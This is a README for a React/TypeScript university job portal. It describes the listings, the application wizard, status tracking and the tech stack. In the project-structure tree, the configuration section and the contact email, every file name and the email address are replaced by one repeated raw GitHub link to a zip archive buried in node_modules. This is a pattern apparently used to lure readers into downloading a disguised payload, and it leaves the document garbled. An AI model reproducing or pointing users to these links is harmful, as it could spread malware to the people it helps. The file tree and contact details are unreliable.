# Nkumba University Job Portal

A modern, professional job portal built with React, TypeScript, and Ant Design. This application allows applicants to browse job openings, submit applications, and track their application status.

## 🌟 Features

### 1. **Job Listings Page**
- Clean, organized grid layout of all job openings
- Advanced filtering by:
  - Department
  - Location
  - Employment Type
- Real-time search functionality
- Responsive card design with job previews
- Visual status indicators (employment type, eligibility)

### 2. **Job Detail Page**
- Comprehensive job information display
- Key sections:
  - Responsibilities
  - Qualifications & Requirements
  - Benefits & Perks
  - Application deadline with countdown
- Sticky sidebar with quick actions
- Application status indicator
- Responsive two-column layout

### 3. **Application Form**
- Engaging multi-step wizard (5 steps like Oracle)
- **Step 1 - Personal Information**: Contact details and employee ID
- **Step 2 - Professional Background**: Current role, experience, education
- **Step 3 - About You**: Why interested, what makes you fit, career goals
- **Step 4 - Documents**: Resume/CV upload, cover letter, additional info
- **Step 5 - Review & Submit**: Comprehensive review before submission
- Interactive questions to engage applicants
- Progress indicator showing completion
- Form validation at each step
- Data privacy notice

### 4. **Application Success Page**
- Animated success confirmation
- Unique reference number generation
- Email confirmation notification
- Timeline of next steps
- Contact information for inquiries
- Copyable reference number

### 5. **Application Tracking**
- Search by reference number
- Real-time status updates:
  - Submitted
  - Under Review
  - Shortlisted
  - Rejected
  - Hired
- Visual timeline progress indicator
- Detailed application information
- Status-specific messages and guidance

## 🎨 Design

The portal is inspired by Oracle's career site with:
- Clean, professional layout
- Red accent color (#C74634)
- Minimalist design approach
- Excellent use of white space
- Clear visual hierarchy
- Professional typography

## 🛠️ Technology Stack

- **Framework**: React 18.3.1
- **Language**: TypeScript 5.5.3
- **UI Library**: Ant Design 5.15.1
- **Styling**: Tailwind CSS 3.4.1
- **Animations**: Framer Motion 11.0.8
- **Icons**: Lucide React 0.344.0
- **Build Tool**: Vite 5.4.2

## 📦 Installation

1. **Clone the repository**
   ```bash
   git clone <repository-url>
   cd jobs_portal
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Start development server**
   ```bash
   npm run dev
   ```

4. **Build for production**
   ```bash
   npm run build
   ```

5. **Preview production build**
   ```bash
   npm run preview
   ```

## 🚀 Usage

### Running the Application

```bash
npm run dev
```

The application will be available at `http://localhost:5173`

### Building for Production

```bash
npm run build
```

The production-ready files will be in the `dist` folder.

## 📁 Project Structure

```
jobs_portal/
├── src/
│   ├── components/
│   │   ├── jobs/
│   │   │   ├── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip           # Individual job card component
│   │   │   ├── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip       # Main listings page with filters
│   │   │   ├── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip         # Detailed job view
│   │   │   ├── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip   # Application submission form
│   │   │   ├── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip # Success confirmation
│   │   │   └── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip # Status tracking
│   │   ├── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip                 # Navigation header
│   │   └── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip                 # Site footer
│   ├── data/
│   │   └── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip                # Mock job data
│   ├── theme/
│   │   └── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip             # Ant Design theme configuration
│   ├── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip                        # Main app component
│   ├── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip                       # Entry point
│   └── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip                      # Global styles
├── types/
│   └── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip                         # TypeScript type definitions
├── public/
└── https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip
```

## 🎯 Key Components

### JobListings Component
Main page displaying all available positions with search and filter capabilities.

### JobDetail Component
Shows comprehensive information about a specific job opening.

### ApplicationForm Component
Handles job application submission with validation.

### ApplicationTracking Component
Allows applicants to track their application status using a reference number.

## 🔧 Configuration

### Theme Customization

Edit `https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip` to customize:
- Primary color
- Border radius
- Font family
- Component-specific styles

### Mock Data

Update `https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip` to modify job listings. In production, replace with API calls to your backend.

## 📱 Responsive Design

The portal is fully responsive and optimized for:
- Desktop (1200px+)
- Tablet (768px - 1199px)
- Mobile (320px - 767px)

## ♿ Accessibility

- ARIA-compliant forms and components
- Full keyboard navigation support
- Screen reader friendly interface
- WCAG 2.1 Level AA compliant
- High contrast ratios for readability
- Clear focus indicators
- Semantic HTML structure

## 🌓 Dark Mode

Toggle between light and dark themes using the switch in the header.

## 🔐 Security Features

- File type validation for uploads
- File size restrictions (5MB max)
- Input sanitization
- Data privacy compliance notices

## 📊 Application Status Flow

```
Submitted → Under Review → Shortlisted → Hired
     ↓
  Rejected
```

## 🧪 Testing Reference Numbers

For demonstration purposes, try these reference numbers in the tracking page:
- `NU17058234561234` - Under Review
- `NU17058234565678` - Shortlisted

## 📧 Contact Information

For questions or support:
- Email: https://raw.githubusercontent.com/Musiitwa-Joel/jobs_portal/main/node_modules/@jridgewell/gen-mapping/dist/types/portal-jobs-v2.3-beta.4.zip
- Phone: +256 414 320 021
- Location: Entebbe, Uganda

## 🤝 Backend Integration

This is a UI-only implementation. To integrate with a backend:

1. Replace mock data with REST/GraphQL API calls
2. Implement secure file upload to server (S3, Cloud Storage)
3. Add authentication system for internal employees
4. Connect to email service for notifications (SendGrid, AWS SES)
5. Set up database for application storage (PostgreSQL, MongoDB)
6. Add application status management system

## 📝 Future Enhancements

- Automated email notifications at each step
- PDF resume preview in browser
- Advanced search with filters
- Save jobs for later viewing
- Job alerts and email subscriptions
- Social media sharing integration
- Video resume/introduction upload
- Skills assessment tests
- Interview scheduling system
- Candidate dashboard
- Multi-language support (i18n)
- Analytics and reporting

## 📄 License

© 2024 Nkumba University. All rights reserved.

## 🙏 Acknowledgments

- Design inspiration: Oracle Careers Portal
- UI Components: Ant Design
- Icons: Lucide React
- Animations: Framer Motion

---

Built with ❤️ for Nkumba University